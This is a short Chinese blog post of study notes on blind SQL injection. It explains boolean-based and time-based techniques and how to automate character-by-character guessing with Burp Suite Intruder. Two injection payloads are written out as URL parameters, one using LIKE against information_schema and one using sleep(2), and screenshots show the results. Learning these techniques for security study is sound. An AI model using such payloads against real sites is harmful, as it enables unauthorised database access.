---
title: sql盲注笔记
toc: true
recommend: 1
uniqueId: '2021-05-04 15:59:48/sql-injection-blind.html'
mathJax: false
date: 2021-05-04 23:59:48
thumbnail:
tags:
categories:
keywords:
---
> 什么是盲注？在sql注入点输入sql语句不回显任何数据，只返回了网页处理的结果（使用布尔盲注），甚至不返回结果（设置数据库查询时间，时间盲注）
>
> 盲注是非常繁琐的，需要不断的更改url进行判断，可以用BP的intruder模块配合

<!-- more -->

## 布尔盲注

从注入点得到当前数据库的表数

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bool-blind.png)

使用BP暴出数据库的名字（一个字母一个字母的暴破）

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bp-sql-blind.png)

爆破该数据库第一张表的名字(也是一个字母一个字母)

```sql
?id=1' and (select table_name 
			from information_schema.tables 
			where table_schema = database() 
			limit 0,1) 
		like 'u%' --+
```

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/bp-sql-blind2.png)

## 时间盲注

如果连网页处理结果都不给的话，还可以设置数据库查询时间进行盲注

比如下面这个页面，不管输入什么都显示一个样

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection-blind-time.png)

利用时间注入，当sql语句运行成功时延时2s

```sql
?id=1' and if(
left(database(),1)='x', sleep(2), 0)
--+
```

进BP的intruder模块进行爆破

![](https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/sql-injection-blind-time2.png)

可以看到响应2s的是开头为s的url，所以数据库的首字母为s

注意：因为没有错误提醒，所以一定要注意在url里sql语法上的问题